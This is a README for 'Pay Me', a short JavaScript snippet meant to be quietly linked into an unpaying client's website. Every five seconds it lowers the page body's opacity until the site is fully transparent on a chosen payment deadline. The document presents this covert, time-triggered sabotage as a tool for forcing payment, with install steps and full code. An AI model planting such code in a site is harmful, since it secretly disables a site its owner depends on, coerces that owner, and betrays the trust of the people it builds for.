# Pay Me
This is for those clients who don't pay. Make their site fade away slowly until it is completely transparent by the payment deadline.
Zero dependecies, works on legacy browsers. They won't see it coming. Literally.

## Installation
Simply copy `payme.js` to your asset directory and  then link to it in your head section as follows `<script src="assets/payme.js" defer></script>`


## Usage
Change `startDate` and `endDate` values to your preferred date range (startDate is normally the day you started asking for your pay).
The existing date format should help you figure out how to structure your dates. 

Once dates have been changed and the js has been linked to on whichever page you want, you need not do anything else. You're set. Okay that was a little redundant.
Now... **Go forth and get your money.**


## The code 
```javascript
var startDate = new Date("12/04/2020 11:00"); // Change this 
var endDate = new Date('12/06/2020 11:00'); // Change this
var maxDiff = endDate - startDate;

var reduceOpacity = function (){
	var timeLeftMs = endDate-Date.now();
	var opacity = timeLeftMs/maxDiff;
  
  document.getElementsByTagName("body")[0].style.opacity= opacity;
}

setInterval(reduceOpacity,5000);
```

